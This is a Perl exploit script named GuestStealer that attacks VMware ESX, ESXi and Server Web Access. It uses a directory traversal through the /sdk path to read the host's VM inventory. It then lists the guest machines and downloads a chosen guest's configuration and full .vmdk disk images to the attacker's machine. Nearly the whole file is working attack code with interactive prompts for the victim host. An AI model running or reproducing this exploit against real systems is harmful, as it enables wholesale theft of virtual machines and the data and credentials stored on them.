#!/usr/bin/perl
########################################################################################################################
# GuestStealer v1.00 - Justin Morehouse (justin.morehouse[at)gmail.com) & Tony Flick (tony.flick(at]fyrmassociates.com #
########################################################################################################################

if ($ARGV[0] eq '--help'){
	print STDERR "\r\nPerl Module Dependencies:\r\n\tLWP::Simple\r\n\tXML::Simple\r\n\tData::Dumper\r\n\tCrypt::SSLeay\r\n\tGetopt::Std\r\n";
	print STDERR "\r\nUsage:\r\n\tperl gueststealer-v1.pl -h <Host> -p <Web Access UI Port> -s <SSL Web Access UI> -t <Server Type> -o <Output Directory>\r\n";
	print STDERR "\r\n";
	print STDERR "\t-h = The target host (IP Address or Host Name)\r\n";
	print STDERR "\t-p = Port for the Web Access UI (Defaults: ESX/ESXi = 80/443, Server = 8222/8333)\r\n";
	print STDERR "\t-s = Is the Web Access UI utilizing SSL (yes/no)\r\n";
	print STDERR "\t-t = Target type (server/esx/esxi)\r\n";
	print STDERR "\t-o = Output directory\r\n";
	print STDERR "\r\nExample Usage: \r\n\tperl gueststealer-v1.pl -h 192.168.1.2 -p 8333 -s yes -t server -o /tmp\r\n\r\n";
	exit 1;
}

############################
# Requirements & Variables #
############################
#use strict;
use LWP::Simple;
use XML::Simple;
use Data::Dumper;
use Crypt::SSLeay;
use Getopt::Std;
$count = 0;

my %opts;
getopts('h:p:s:t:o:', \%opts);

###################
# Select the Host #
###################

# If no host name was entered on the command line, ask for it
if (!$opts{h}){
	print "\nEnter the the vulnerable server's Hostname or IP Address:\n";
	chomp ($victim = <>);
}
else{
	$victim = $opts{h};
}
# Prompt the user for a syntactically valid host name or ip address until they provide a valid one
while (($victim !~ /^\s*(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\s*$/) && ($victim !~ /^\s*(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\-]*[A-Za-z0-9])\s*$/)){
	print "\nSystem was invalid.\nEnter the the vulnerable server's Hostname or IP Address:\n";
	chomp ($victim = <>);
}

# Remove leading and trailing spaces
$victim =~ s/^\s+//;
$victim =~ s/\s+$//;

# If no port number was entered on the command line, ask for it
if (!$opts{p}){
	print "\nEnter the Web Access User Interface port number (0-65535):\n";
	chomp ($port = <>);
}
else
{
	$port = $opts{p};
}

# Prompt the user for a valid port number until they provide a valid answer
while (($port !~ /^\s*[0]*\d{1,5}\s*$/) || ($port > 65535)){
	print "\n$port is an invalid port number.\nEnter the Web Access User Interface port number (0-65535):\n";
	chomp ($port = <>);
}

# Remove leading and trailing spaces
$port =~ s/^\s+//;
$port =~ s/\s+$//;

# Remove leading zeros from the port number
if ($port == 0){
	# Handles the case where the user entered a port number of all 0's
	$port = 0;
}
else{
	$port =~ s/^0*//;
}


# If SSL is not specified on the command line, ask for it
if (!$opts{s}){
	print "\nDoes the User Interface use SSL (yes/no):\n";
	chomp ($ssl = <>);
}
else{
	$ssl = $opts{s};
}

# Prompt the user for whether to use SSL or not until they provide a valid form of yes or no
while (($ssl !~ /^\s*yes\s*$/i) && ($ssl !~ /^\s*no\s*$/i)){
	print "\n$ssl is an invalid answer.\nDoes the User Interface use SSL (yes/no):\n";
	chomp ($ssl = <>);
}

if ($ssl =~ m/^\s*yes\s*$/i){
	$PwnURL = "https://";
}
else{
	$PwnURL = "http://";
}

# Create the first half of the URL exploit
$PwnURL = $PwnURL . "$victim:$port";

# If the type of target is not specified on the command line, ask for it
if (!$opts{t}){
	print "\nEnter the type of the target (Server, ESX, or ESXi):\n";
	chomp ($targetType = <>);
}
else{
	$targetType = $opts{t};
}

# Prompt the user for whether the target is running esx, esxi, or server
while (($targetType !~ /^\s*esx\s*$/i) && ($targetType !~ /^\s*esxi\s*$/i) && ($targetType !~ /^\s*server\s*$/i)){
	print "\n$targetType is an invalid target type.\nEnter the type of the target (Server, ESX, or ESXi):\n";
	chomp ($targetType = <>);
}

# Create the attack URL string based on whether the target is esx/esxi or server
if (($targetType =~ m/^\s*esx\s*$/i) || ($targetType =~ m/^\s*esxi\s*$/i)){
	$PwnURL = $PwnURL . "/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E";
}
else{
	$PwnURL = $PwnURL . "/sdk/../../../../../..";
}


$GetURL = $PwnURL . "/etc/vmware/hostd/vmInventory.xml";

# Obtain the inventory of Virtual Machines. If it can not grab the vmInventory.xml file, 
# print an error message and kill the program.
$err = getstore($GetURL, "/tmp/vmInventory.xml");
if (is_error($err)){
	print "Unable to obtain the inventory of virtual machines: HTTP $err\n";
	unlink("/tmp/vmInventory.xml");
	exit 1;
}


###############################
# Identify the Guest to steal #
###############################
print "\nThe following Guests are available on this Host:\n";
print "------------------------------------------------\n";
print " ID - Virtual Machine (Guest)\n"; 
print "------------------------------------------------\n";

# Create the XML::Simple object
$xml = new XML::Simple (KeyAttr=>[]);

# Read and store the guest inventory file
$data = $xml->XMLin("/tmp/vmInventory.xml");

# Access XML data
# Handles when there is more than one guest available in the inventory file
if (ref($data->{ConfigEntry}) eq "ARRAY"){
	foreach $e (@{$data->{ConfigEntry}})
	{
		print "  $count - ";	
		$TmpGuest = $e->{vmxCfgPath};
		$TmpGuest =~ s/.vmx//g;
		print "$TmpGuest\n";
		push(@vms,$e->{vmxCfgPath});
		$count++;
	}
}
# Handles when there is only one guest in the inventory file
elsif (ref($data->{ConfigEntry}) eq "HASH"){
	print "  $count - ";
	$TmpGuest = %{$data->{ConfigEntry}}->{vmxCfgPath};
	$TmpGuest =~ s/.vmx//g;
	print "$TmpGuest\n";
	push(@vms,%{$data->{ConfigEntry}}->{vmxCfgPath});
	$count++;
}
# Handles when there are no guests listed in the inventory file. 
# I.e., there are no guests on this system, so it's time to quit.
else{
	print "There are no virtual machines on this system.\n";
	exit 1;
}

################
# Which Guest? #
################
print "\nWhich Guest would you like to steal? (Enter the ID #)\n";
chomp($GuestID = <>);

# Remove leading and trailing spaces
$GuestID =~ s/^\s+//;
$GuestID =~ s/\s+$//;

# Prompt the user for which guest to steal until they choose a valid index
while (($GuestID !~ /^\s*[0]*\d+\s*$/) || ($GuestID >= $count)){
	print "\n$GuestID is not a valid guest index. Which Guest would you like to steal? (Enter the ID #)\n";
	chomp ($GuestID = <>);
	$GuestID =~ s/^\s+//;
	$GuestID =~ s/\s+$//;
}

# Select the target guest from the array of guests
$Target = @vms[$GuestID];
$Target =~ s/ /%20/g;

#VMDK Path Determination & Manipulation
@TmpPath = split('/', $Target);
$DirCount = scalar(@TmpPath);
$Target = $TmpPath[$#TmpPath];
$DirCount = $DirCount - 2;
shift(@TmpPath);

while ($DirCount > 0) {
	$TargetPath = $TargetPath . "/" . $TmpPath[0];
	shift(@TmpPath);
	$DirCount--;
}

$TargetClean = $Target;
$TargetClean =~ s/%20/ /g;
$TargetPath = $TargetPath . "/";

# If no path was entered on the command line, ask for it
if (!$opts{o}){
	print "\nWhere would you like to save the stolen Guest? (Example: /tmp)\n";
	chomp($GuestPath = <>);
}
else{
	$GuestPath = $opts{o};	
}

# If the directory path does not exist, ask for another path
while (!(-d $GuestPath)){
	print "\nThe path (\"$GuestPath\") you entered does not exist. Where would you like to save the stolen Guest? (Example: /tmp)\n";
	chomp($GuestPath = <>);
}

# Steal the .vmx
FetchGuests(".vmx", ".vmx");

##################
# Parse the .vmx #
##################
print " - Parsing the .vmx to identify disk images...\n";
$OpenFile = $GuestPath . "/" . $TargetClean;

# Open .vmx file
open(DATA, $OpenFile) || die("Could not open the .vmx file!");
@VMX=<DATA>;
close(DATA);

# Read the .vmx file
foreach $Line (@VMX) {
	if ($Line =~ /fileName/xms) {
		if ($Line =~ /.vmdk/xms) {
			($Null,$DiskImage)=split(/\"/,$Line);		
			print "   - Found: $DiskImage!\n";
			$DiskImage =~ s/ /%20/g;
			push(@Images, $DiskImage);		
		}
	}
}

###################
# Steal the Guest #
###################
# Steal the .nvram
FetchGuests(".vmx", ".nvram");

# Steal the .vmxf
FetchGuests(".nvram", ".vmxf");

# Define a list of the files we've downloaded (to prevent double downloading a file)
%Downloaded = ();

# Steal the .vmdk(s)
foreach (@Images) {
	$VmdkName = $_;
	$StealURL = $PwnURL . $TargetPath . $VmdkName;

	$VmdkNameClean = $VmdkName;
	$VmdkNameClean =~ s/%20/ /g;	
	print "\nStealing $VmdkNameClean...";

	# Check if the file already exists
	if(exists($Downloaded{$StealURL}))
	{
		print "already downloaded, skipping!\n";
		next;
	}

	# Mark the file as downloaded
	$Downloaded{$StealURL} = 1;


	#Flush the buffer before starting the download. We could be here for a while.
	$| = 1;	
	$err = getstore($StealURL, "$GuestPath/$VmdkNameClean");
	if (is_error($err)){
		die "Could not steal the file: HTTP $err\n";
	}
	print "Success!\n";

	$filesize = -s "$GuestPath/$VmdkNameClean";


	$VMDKFile = $GuestPath . "/" . $VmdkNameClean;

	print "\nParsing the .vmdk file...\n";		
	# Open .vmdk file
	open(DATA, $VMDKFile) || die("Could not open .vmdk file!");

	# Read through at most the first 100 lines of the vmdk
	# Prevents parsing of huge files
	while (($Line = <DATA>) && ($. < 100)){
		if ($Line =~ /FLAT/xms) {
			($Null,$VMDKImage,$Null)=split(/\"/,$Line);
			# Check if already added to the Images array
			if (!(grep {$_ eq $VMDKImage} @Images)){
				print "   - Found: $VMDKImage!\n";
				$VMDKImage =~ s/ /%20/g;
				push(@Images, $VMDKImage);
			}
		}
		if ($Line =~ /VMFS/xms) {
			($Null,$VMDKImage,$Null)=split(/\"/,$Line);
			# Check if already added to the Images array
			if (!(grep {$_ eq $VMDKImage} @Images)){
				print "   - Found: $VMDKImage!\n";
				$VMDKImage =~ s/ /%20/g;
				push(@Images, $VMDKImage);
			}
		}
		if ($Line =~ /SPARSE/xms) {
			($Null,$VMDKImage,$Null)=split(/\"/,$Line);
			# Check if already added to the Images array
			if (!(grep {$_ eq $VMDKImage} @Images)){
				print "   - Found: $VMDKImage!\n";
				$VMDKImage =~ s/ /%20/g;
				push(@Images, $VMDKImage);
			}
		}
		if ($Line =~ /parentFileNameHint/xms){
			($Null,$VMDKImage,$Null)=split(/\"/,$Line);
			# Check if already added to the Images array
			if (!(grep {$_ eq $VMDKImage} @Images)){
				print "   - Found: $VMDKImage!\n";
				$VMDKImage =~ s/ /%20/g;
				push(@Images, $VMDKImage);
			}
		}
	}

}

close(DATA);

# Your treasures await!
print "\nYour stolen Guest awaits in: $GuestPath\n";

###############
# Subroutines #
###############
sub FetchGuests {
	($SubStealOldExt, $SubStealNewExt) = @_;

	$Target =~ s/$SubStealOldExt/$SubStealNewExt/g;
	$TargetClean =~ s/$SubStealOldExt/$SubStealNewExt/g;

	$StealURL = $PwnURL . $TargetPath . $Target;   

	print "\nStealing $TargetClean...";
	#Flush the buffer before starting the download
	$| = 1;	

	$err = getstore($StealURL, "$GuestPath/$TargetClean");
	if (is_error($err)){
		die "Could not steal the file: HTTP $err\n";
	}

	print "Success!\n";
}

############
# Clean Up #
############
unlink("/tmp/vmInventory.xml");
